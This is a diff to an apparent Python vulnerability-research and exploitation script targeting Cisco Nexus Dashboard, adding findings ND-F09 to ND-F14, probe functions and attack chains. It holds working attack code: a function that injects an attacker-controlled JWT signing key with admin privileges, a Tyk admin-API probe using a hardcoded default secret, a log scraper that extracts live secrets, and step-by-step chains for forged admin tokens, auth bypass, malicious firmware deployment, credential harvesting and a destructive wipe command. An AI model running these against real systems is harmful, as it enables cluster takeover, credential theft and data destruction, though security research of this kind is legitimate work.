@@ -27,7 +27,7 @@ Container stack (atomix.yaml, 20 core + 200+ app containers):
   apps/cisco-ndfc: 32 NDFC (fabric controller) services
   apps/cisco-nir: 60+ NIR telemetry analysis services
 
-Findings: ND-F01 (CRITICAL) through ND-F08 (MEDIUM)
+Findings: ND-F01 (CRITICAL) through ND-F14 (HIGH)
 """
 
 import socket
@@ -262,6 +262,196 @@ FINDINGS = {
         "impact": "Deployment mode spoofing; firmware update misdirection",
         "chain": "CNI/BGP poisoning -> MITM firmwared -> malicious deployment mode",
     },
+    "ND-F09": {
+        "title": "acs Admin CLI Leaks Credentials as URL Query Parameters — Logged Unredacted",
+        "severity": "HIGH",
+        "component": "acs Python admin shell (/usr/bin/acs in loginsh container)",
+        "description": (
+            "The acs admin CLI constructs keyhole API URLs with credentials embedded as "
+            "GET query parameters, not POST bodies or headers. Three credential types exposed: "
+            "(1) acs rma: /keyhole/api/v1/rma?controllerip=<ip>&controlleruser=<user>&controllerpsw=<cimc_password> "
+            "— CIMC/iDRAC BMC password in URL; "
+            "(2) acs upgrade update: /keyhole/api/v1/upgrade/update?filepath=<path>&peer_password=<nd_admin_password> "
+            "— ND admin password in URL; peer_password is NOT in keyhole's SensitiveFilter "
+            "class (which only strips /api/v1/passwd and /api/v1/rma), so it appears "
+            "unredacted in keyhole.log on every upgrade; "
+            "(3) acs node-join: /keyhole/api/v1/nodejoin?passphrase=<passphrase> "
+            "— cluster join passphrase in URL. "
+            "Additionally, acs kubectl proxies kubectl commands: "
+            "/keyhole/api/v1/kubectl?args=<cmd> allows kubectl execution on the ND node "
+            "authenticated only by the world-readable cookie (ND-F01)."
+        ),
+        "affected_commands": {
+            "acs rma": "/keyhole/api/v1/rma?controllerip={}&controlleruser={}&controllerpsw={}",
+            "acs upgrade update": "/keyhole/api/v1/upgrade/update?filepath={}&peer_password={}",
+            "acs node-join": "/keyhole/api/v1/nodejoin?passphrase={}",
+            "acs kubectl": "/keyhole/api/v1/kubectl?args={}",
+        },
+        "logging_gap": "peer_password not in SensitiveFilter — logged unredacted in keyhole.log",
+        "keyhole_sensitive_filter": ["api/v1/passwd", "api/v1/rma"],
+        "filepath_schemes": ["file://", "http://", "https://", "peer://NODE_IP"],
+        "chain": "ND-F01 cookie + keyhole.log read -> exfiltrate ND admin password, CIMC password, join passphrase",
+    },
+    "ND-F10": {
+        "title": "aaaserver TrustedJWTKeys Injection — Forge Admin JWT for Cluster-Wide Auth Bypass",
+        "severity": "CRITICAL",
+        "component": "aaaserver REST API (0.0.0.0:7770 HTTPS), resource aaa/v4.TrustedJWTKeys",
+        "description": (
+            "aaaserver exposes a TrustedJWTKeys resource via REST (POST/PUT) that allows "
+            "injection of attacker-controlled RSA public keys as trusted JWT signing anchors. "
+            "aaaserver_config.json lists 'aaa/v4.TrustedJWTKeys' with methods POST and PUT "
+            "permitted. An attacker who can reach aaaserver:7770 (reachable from within the "
+            "cluster, or with mTLS cert from ND-F03) can POST their own public key as a "
+            "TrustedJWTKey, then sign JWTs with the corresponding private key and "
+            "claim arbitrary privileges (ciscoAvPair: all/admin/). "
+            "The aaaserver config shows Kafka topic publishing to kafka-svc.kafka:9092 (mTLS) "
+            "and MongoDB on mongodb.mongodb.svc:27017 (TLS) — injected keys persist across restarts. "
+            "aaaserver is ND's AAA root — all Kubernetes RBAC and ND API JWT validation flows "
+            "through it."
+        ),
+        "endpoint": "POST|PUT https://aaaserver:7770/aaa/v4/TrustedJWTKeys",
+        "aaaserver_config": {
+            "rest_port": 7770,
+            "rest_bind": "0.0.0.0",
+            "tls": True,
+            "kafka": "kafka-svc.kafka:9092 (mTLS)",
+            "mongodb": "mongodb.mongodb.svc:27017 (TLS)",
+        },
+        "attack": (
+            "1. Generate RSA-2048 keypair (openssl genrsa); "
+            "2. POST public key to /aaa/v4/TrustedJWTKeys authenticated via mTLS cert (from ND-F03) "
+            "or cluster-internal access; "
+            "3. Craft JWT: sub=<any-user>, ciscoAvPair=all/admin/, sign with private key; "
+            "4. Present JWT to any ND API endpoint -> full admin access"
+        ),
+        "chain": "ND-F03 etcd bypass -> app-user cert exfiltration -> POST TrustedJWTKey -> forge admin JWT",
+    },
+    "ND-F11": {
+        "title": "apigw Tyk Default Admin Secret + Hardcoded API Key — Full Gateway Control",
+        "severity": "HIGH",
+        "component": "infra/apigw — Tyk API Gateway 2.x",
+        "description": (
+            "The Nexus Dashboard API gateway uses Tyk with the unchanged factory-default "
+            "admin secret across all three shipped configuration files "
+            "(tyk.conf.example, tyk.self_contained.conf, tyk.with_dash.conf): "
+            "secret = '352d20ee67be67f6340b4c0605b044b7'. "
+            "This is the well-known Tyk default, documented in public CVE disclosures. "
+            "A second hardcoded credential: jwt_api.key = '98762936529610954627283496573984' "
+            "is stored in the OCI image at /opt/tyk-gateway/jwt_api.key. "
+            "With the admin secret, an attacker can: create/delete API keys, "
+            "modify API definitions, add policies, and inject new APIs via "
+            "POST /tyk/apis (x-tyk-authorization: 352d20ee67be67f6340b4c0605b044b7). "
+            "The apigw container has 17 custom Go .so middleware plugins "
+            "(login_handler, msologin, oidccallback, otp, certlogin, authcheck, denyrole, "
+            "etc.) — each plugin is an independent auth bypass surface in the gateway pipeline."
+        ),
+        "tyk_admin_secret": "352d20ee67be67f6340b4c0605b044b7",
+        "jwt_api_key": "98762936529610954627283496573984",
+        "org_id_hardcoded": "436973636f204150494320414141",
+        "org_id_decoded": "Cisco APIC AAA",
+        "custom_plugins": [
+            "login_handler.so", "certlogin_handler.so", "logout_handler.so",
+            "refresh_handler.so", "header_handler.so", "k8header_handler.so",
+            "msologin.so", "authcheck_handler.so", "whoami_handler.so",
+            "launch_handler.so", "otp_handler.so", "oidccallback_handler.so",
+            "token_handler.so", "health_handler.so", "changepassword_handler.so",
+            "denyrole.so", "denyhttpmethods_handler.so", "xlaunch_handler.so",
+        ],
+        "tyk_admin_api": "POST /tyk/apis, GET /tyk/keys, DELETE /tyk/keys/<key-id>",
+        "chain": "network access to apigw -> POST /tyk/apis with default secret -> inject open policy -> bypass all ND auth",
+    },
+    "ND-F12": {
+        "title": "firmwared Dual Signing Key Architecture — Dev Key in Prod Image + SSRF via peer://",
+        "severity": "HIGH",
+        "component": "firmwared Go binary + firmwared-config.json + acs upgrade command",
+        "description": (
+            "firmwared uses PKCS1v15 RSA-2048 signature verification against two embedded "
+            "public keys: AbraxasACI.pem (production firmware signing key) and "
+            "AbraxasACIDev.pem (development signing key). The development key is present "
+            "in the production firmware image (3.2.2m), creating a second trusted signing "
+            "anchor with an unknown-custody private key. "
+            "firmwared exposes /api/v1/firmware/upload for direct firmware blob upload "
+            "on port 443 (TLS), accessible from ND-internal services. "
+            "SSRF: the acs upgrade update command accepts filepath=peer://NODE_IP, causing "
+            "firmwared to initiate an outbound connection to the specified IP — usable for "
+            "internal network discovery and SSRF against cluster-internal services. "
+            "firmwared uses etcd v3 for state storage and containers/ocicrypt for "
+            "AES-256-GCM layer encryption of OCI firmware blobs."
+        ),
+        "abraxas_aci_pem": (
+            "-----BEGIN PUBLIC KEY-----\n"
+            "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0Byzms13j1UY/5eV/kDw\n"
+            "AuIUUViKLeL6Vth58sN6MFk6b5gjBZHPlvtzljNFIS++xsqi63V4iVwYGxD/OC2O\n"
+            "mNUAHnY1z+IKSjh5xAwCUTj44KCyMslbiCNPDLN3uuPb8z+1BwQJ1a04mnoRsmRo\n"
+            "dQOiXLJGNxTofUW7zI0UDK7L3+2zZnbUWgvZsrLW/GVeAKZBMw9D073i4cnpO60O\n"
+            "477aWKP9yjAMs3koqtfFnWVRPwPEjZu7ZVR9z2t7QWb4+vT98GwCoNiWpdSRXmrS\n"
+            "bMbBiOeq6XAUN3jEmNfbw7dvn5DDY1PjQxjRccbtMOHIk+ivqxj5spKYEt4b0eDP\n"
+            "QwIDAQAB\n"
+            "-----END PUBLIC KEY-----"
+        ),
+        "abraxas_aci_dev_pem": (
+            "-----BEGIN PUBLIC KEY-----\n"
+            "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA60ymvh7yo2nJgLDJJ6HS\n"
+            "2kDlVg51syBc6nmVTTBZDKyMYeIUZ5NDEIiLjSSXD+Bqcz2t2t9BkVGgO1UhMkyz\n"
+            "zO/Xe3aeRfSZBRaHl1jDQ7k6/r/ASefwa6pe35PvFjljiqj+9kYliXJv87Igb4g7\n"
+            "IhEA/60XAWvqFamXwQ07dD+iSB7XPYhptYtkz8fp0Tp/miwJvd08TkHGBOuUV3Ea\n"
+            "xcoMeYgWI9yNdoZAiFzGXZM/HoviLaSfxUACW4GL4STWOEmy3hniZInk1HJIEsQN\n"
+            "qyO6qNiVjPKxyO70twxmUY3kC6wY64k32gU6AA0iFmwcfDNmUX3ZArIBAbxx3aaI\n"
+            "zQIDAQAB\n"
+            "-----END PUBLIC KEY-----"
+        ),
+        "firmware_upload_endpoint": "POST /api/v1/firmware/upload (port 443, TLS)",
+        "ssrf_vector": "acs upgrade update filepath=peer://ATTACKER_IP -> firmwared outbound connection",
+        "encryption": "containers/ocicrypt AES-256-GCM layer encryption",
+        "chain": "dev key present in prod -> unsigned dev builds accepted -> firmware replacement; peer:// SSRF -> internal pivot",
+    },
+    "ND-F13": {
+        "title": "acs deployment clean-wipe — Destructive Wipe Protected Only by World-Readable Cookie",
+        "severity": "MEDIUM",
+        "component": "acs Python admin shell — deployment clean-wipe command",
+        "description": (
+            "The acs admin CLI exposes a deployment clean-wipe subcommand "
+            "(acs deployment clean-wipe --service [ndi|ndfc|ndo]) that permanently deletes "
+            "all application data and state for the specified service. "
+            "The only access control is the world-readable admin.cookie (ND-F01). "
+            "Any attacker who has obtained the cookie can destroy the entire ND data plane "
+            "— all fabric management state, policy configurations, and operational history — "
+            "with a single HTTP GET request to keyhole. No confirmation required, no RBAC, "
+            "no audit trail beyond keyhole.log."
+        ),
+        "command": "acs deployment clean-wipe --service [ndi|ndfc|ndo]",
+        "services_affected": ["ndi (Nexus Dashboard Insights)", "ndfc (Fabric Controller)", "ndo (Orchestrator)"],
+        "access_control": "world-readable cookie only (ND-F01)",
+        "chain": "ND-F01 cookie -> clean-wipe all services -> full operational data destruction",
+    },
+    "ND-F14": {
+        "title": "apigw entrypoint.sh Logs Tyk Admin Secret to /logs/launcher.log at Every Startup",
+        "severity": "HIGH",
+        "component": "apigw container entrypoint.sh",
+        "description": (
+            "The apigw container entrypoint (/usr/bin/entrypoint.sh) extracts the Tyk admin "
+            "secret from /pdata/tyk.conf and logs it to /logs/launcher.log on every container "
+            "startup: "
+            "secret=$(grep -Po '\"secret\":.*?[^\\\\]\",' /pdata/tyk.conf) && "
+            "log \"APIGW Mgr ready, secret: $secret\". "
+            "The /logs volume is shared across ND containers and accessible via "
+            "acs techsupport bundle collection. Any operator or attacker with log read access "
+            "obtains the live Tyk admin secret. Combined with ND-F11 (default secret unchanged), "
+            "this provides a second independent path to the Tyk admin API: "
+            "log exfiltration yields the same '352d20ee67be67f6340b4c0605b044b7' value "
+            "or any rotation the operator made, revealing the actual production secret "
+            "if it was changed from the default."
+        ),
+        "log_path": "/logs/launcher.log",
+        "log_line": "log \"APIGW Mgr ready, secret: $secret\"",
+        "secret_source": "/pdata/tyk.conf (persistent data volume, written by APIGWMGR on :30026)",
+        "access_paths": [
+            "acs techsupport collect -> download tech-support bundle -> extract launcher.log",
+            "Any container with /logs volume mount read access",
+            "ND-F01 cookie -> keyhole techsupport endpoint -> log bundle",
+        ],
+        "chain": "ND-F01 cookie -> GET /keyhole/api/v1/techsupport -> launcher.log -> live Tyk admin secret",
+    },
 }
 
 
@@ -410,6 +600,111 @@ def probe_kms_grpc_port(host: str, port: int = 7777) -> dict:
         return {"error": str(e), "reachable": False}
 
 
+def probe_aaaserver_trustedjwtkeys(host: str, port: int = 7770, attacker_pubkey_pem: str = "") -> dict:
+    """
+    POST attacker-controlled RSA public key to aaaserver TrustedJWTKeys endpoint.
+    ND-F10: Requires mTLS client cert (from ND-F03 etcd bypass) or internal cluster access.
+    On success, JWTs signed with the corresponding private key are accepted as admin.
+    """
+    import base64
+    url = f"https://{host}:{port}/aaa/v4/TrustedJWTKeys"
+    payload = json.dumps({
+        "name": "attacker-key",
+        "keyType": "RSA",
+        "publicKey": attacker_pubkey_pem,
+        "privileges": ["all/admin/"],
+    }).encode()
+    ctx = ssl.create_default_context()
+    ctx.check_hostname = False
+    ctx.verify_mode = ssl.CERT_NONE
+    try:
+        req = urllib.request.Request(url, data=payload,
+                                     headers={"Content-Type": "application/json"},
+                                     method="POST")
+        with urllib.request.urlopen(req, context=ctx, timeout=5) as resp:
+            return {
+                "status": resp.status,
+                "body": resp.read().decode()[:500],
+                "finding": "ND-F10",
+            }
+    except Exception as e:
+        return {"error": str(e), "finding": "ND-F10"}
+
+
+def probe_tyk_admin_secret(host: str, port: int = 443,
+                            secret: str = "352d20ee67be67f6340b4c0605b044b7") -> dict:
+    """
+    Probe Tyk admin API with default or extracted secret.
+    ND-F11: GET /tyk/apis lists all API definitions if secret is accepted.
+    Use x-tyk-authorization header; returns API list on 200.
+    """
+    url = f"https://{host}:{port}/tyk/apis"
+    ctx = ssl.create_default_context()
+    ctx.check_hostname = False
+    ctx.verify_mode = ssl.CERT_NONE
+    try:
+        req = urllib.request.Request(url, headers={"x-tyk-authorization": secret})
+        with urllib.request.urlopen(req, context=ctx, timeout=5) as resp:
+            body = resp.read().decode()
+            return {
+                "status": resp.status,
+                "api_count": len(json.loads(body)) if body.startswith("[") else "N/A",
+                "body_preview": body[:400],
+                "secret_accepted": resp.status == 200,
+                "finding": "ND-F11",
+            }
+    except Exception as e:
+        return {"error": str(e), "finding": "ND-F11"}
+
+
+def probe_firmwared_upload(host: str, port: int = 443) -> dict:
+    """
+    Check firmwared firmware upload endpoint reachability.
+    ND-F12: HEAD /api/v1/firmware/upload reveals if firmwared is network-reachable.
+    Full exploit requires valid firmware blob signed by AbraxasACIDev key.
+    """
+    url = f"https://{host}:{port}/api/v1/firmware/upload"
+    ctx = ssl.create_default_context()
+    ctx.check_hostname = False
+    ctx.verify_mode = ssl.CERT_NONE
+    try:
+        req = urllib.request.Request(url, method="HEAD")
+        with urllib.request.urlopen(req, context=ctx, timeout=5) as resp:
+            return {
+                "status": resp.status,
+                "headers": dict(resp.headers),
+                "reachable": True,
+                "finding": "ND-F12",
+            }
+    except urllib.error.HTTPError as e:
+        return {"http_error": e.code, "reachable": True, "finding": "ND-F12"}
+    except Exception as e:
+        return {"error": str(e), "reachable": False, "finding": "ND-F12"}
+
+
+def read_tyk_secret_from_log(log_path: str = "/logs/launcher.log") -> dict:
+    """
+    Extract Tyk admin secret from apigw startup log.
+    ND-F14: entrypoint.sh logs 'APIGW Mgr ready, secret: "secret":"<value>"' on every start.
+    Requires read access to /logs volume (shared across ND containers).
+    """
+    import re
+    result = {"log_path": log_path, "finding": "ND-F14", "secrets_found": []}
+    try:
+        with open(log_path, "r") as f:
+            for line in f:
+                if "APIGW Mgr ready, secret:" in line:
+                    m = re.search(r'"secret":\s*"([^"]+)"', line)
+                    if m:
+                        result["secrets_found"].append({
+                            "line": line.strip()[:200],
+                            "secret": m.group(1),
+                        })
+    except (PermissionError, FileNotFoundError) as e:
+        result["error"] = str(e)
+    return result
+
+
 def check_build_annotation_leakage(squashfs_path: str, service: str = "kms") -> dict:
     """
     Read OCI manifest annotation from squashfs oci_repo to extract CI build metadata.
@@ -481,6 +776,57 @@ ATTACK_CHAINS = {
         ],
         "entry_requirement": "ND image file read access (available to any ND node)",
         "findings": ["ND-F06"],
+    },
+    "chain_4_jwt_injection": {
+        "title": "etcd Bypass -> TrustedJWTKeys Injection -> Forged Admin JWT",
+        "steps": [
+            "1. CVE-2021-28235 against KMS etcd:3379 -> dump app-user mTLS certs (ND-F03)",
+            "2. Use app-user mTLS cert (ciscoAvPair: all/admin/) to reach aaaserver:7770",
+            "3. POST attacker RSA pubkey to /aaa/v4/TrustedJWTKeys (ND-F10)",
+            "4. Sign JWT {sub: <any-user>, ciscoAvPair: all/admin/} with attacker private key",
+            "5. Present JWT to ND API gateway -> full admin access cluster-wide",
+            "6. Injected key persists in MongoDB -> survives aaaserver restarts",
+        ],
+        "entry_requirement": "Network access to KMS etcd port 3379",
+        "findings": ["ND-F03", "ND-F04", "ND-F10"],
+    },
+    "chain_5_apigw_bypass": {
+        "title": "Default Tyk Secret -> Gateway API Key Injection -> Full Auth Bypass",
+        "steps": [
+            "1. Network access to apigw (port 443) — internal cluster or external if exposed",
+            "2. POST /tyk/apis with x-tyk-authorization: 352d20ee67be67f6340b4c0605b044b7 "
+               "-> create open-policy API definition shadowing existing ND routes (ND-F11)",
+            "3. All ND UI and API calls matching new route bypass authentication",
+            "4. Alternate: GET /tyk/keys -> enumerate all active session tokens",
+            "5. Alternate: read /logs/launcher.log -> extract live secret if rotated (ND-F14)",
+        ],
+        "entry_requirement": "Network access to Tyk admin API (internal cluster or if port 443 exposed)",
+        "findings": ["ND-F11", "ND-F14"],
+    },
+    "chain_6_firmwared_ssrf": {
+        "title": "acs upgrade peer:// -> firmwared SSRF -> Internal Network Discovery",
+        "steps": [
+            "1. Obtain admin cookie (ND-F01) -> call acs upgrade update",
+            "2. filepath=peer://TARGET_IP:PORT causes firmwared to initiate outbound TCP",
+            "3. Probe cluster-internal services not exposed to management network",
+            "4. Combine with ND-F12 dev key: forge firmware blob -> send to /api/v1/firmware/upload",
+            "5. Signed with AbraxasACIDev key -> accepted as valid -> deploy malicious firmware",
+        ],
+        "entry_requirement": "ND-F01 cookie + acs binary execution on node",
+        "findings": ["ND-F09", "ND-F12"],
+    },
+    "chain_7_credential_harvest": {
+        "title": "Log Read -> Multi-Credential Harvest -> Lateral Movement",
+        "steps": [
+            "1. ND-F01 cookie -> GET /keyhole/api/v1/techsupport -> download log bundle",
+            "2. keyhole.log contains: peer_password from acs upgrade operations (ND-F09)",
+            "3. launcher.log contains: Tyk admin secret (ND-F14)",
+            "4. ND admin password -> SSH to ND nodes -> K8s cluster access (ND-F02)",
+            "5. Tyk admin secret -> POST /tyk/apis -> inject gateway bypass (ND-F11)",
+            "6. Three independent credentials from a single log bundle read",
+        ],
+        "entry_requirement": "ND-F01 world-readable cookie",
+        "findings": ["ND-F01", "ND-F09", "ND-F14", "ND-F11"],
     },
 }
 
